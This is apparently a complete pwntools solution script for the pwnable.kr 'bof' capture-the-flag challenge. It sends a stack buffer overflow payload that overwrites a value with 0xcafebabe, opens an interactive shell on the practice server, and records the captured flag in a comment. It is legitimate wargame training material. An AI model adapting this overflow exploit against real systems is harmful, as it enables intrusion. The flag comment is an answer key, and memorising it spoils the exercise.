from pwn import *

context.log_level = 'debug'

r = remote('pwnable.kr',9000)

payload = 'A'*0x2c + 'B'*8
payload += p32(0xcafebabe)

r.sendline(payload)

r.interactive()

# flag = "daddy, I just pwned a buFFer :)"
